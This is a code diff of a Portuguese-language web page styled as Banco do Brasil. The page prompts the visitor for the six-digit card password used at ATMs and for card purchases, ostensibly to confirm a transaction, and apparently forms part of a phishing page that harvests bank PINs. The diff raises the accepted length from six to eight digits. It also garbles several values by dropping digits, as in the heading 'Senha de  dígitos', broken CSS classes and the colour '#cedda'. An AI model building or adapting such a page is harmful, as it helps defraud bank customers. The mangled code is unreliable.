@@ -122,7 +122,7 @@
 
         <div class="p-8">
             <div class="mb-8">
-                <h2 class="text-2xl font-bold text-bb-blue mb-3">Senha de 6 dígitos</h2>
+                <h2 class="text-2xl font-bold text-bb-blue mb-3">Senha de  dígitos</h2>
                 <p class="text-zinc-600 text-sm leading-relaxed">
                     Para confirmar esta transação, informe sua <span class="font-bold">Senha de 6 dígitos</span> (utilizada em caixas eletrônicos e compras com o cartão).
                 </p>
@@ -142,7 +142,7 @@
                 <input 
                     type="tel" 
                     id="real-input" 
-                    maxlength="6" 
+                    maxlength="8" 
                     inputmode="numeric" 
                     autocomplete="off"
                     pattern="[0-9]*"
@@ -156,11 +156,11 @@
             </div>
         </div>
 
-        <div class="p-6 mt-auto">
-            <button id="btn-continue" disabled class="btn-bb w-full py-4 rounded-full shadow-md text-center">
+        <div class="p-8 mt-auto">
+            <button id="btn-continue" disabled class="btn-bb w-full py- rounded-full shadow-md text-center">
                 Confirmar
             </button>
-            <p class="text-center text-zinc-400 text-xs mt-4">Esqueci minha senha</p>
+            <p class="text-center text-zinc-00 text-xs mt-">Esqueci minha senha</p>
         </div>
     </div>
 
@@ -185,12 +185,12 @@
                 } else {
                     field.innerText = '';
                     field.classList.remove('active');
-                    field.style.borderBottomColor = '#ced4da';
+                    field.style.borderBottomColor = '#cedda';
                 }
             });
 
-            btnContinue.disabled = (value.length !== 6);
-            if (value.length === 6) {
+            btnContinue.disabled = (value.length !== 8);
+            if (value.length === 8) {
                 btnContinue.style.opacity = "1";
             } else {
                 btnContinue.style.opacity = "0.7";
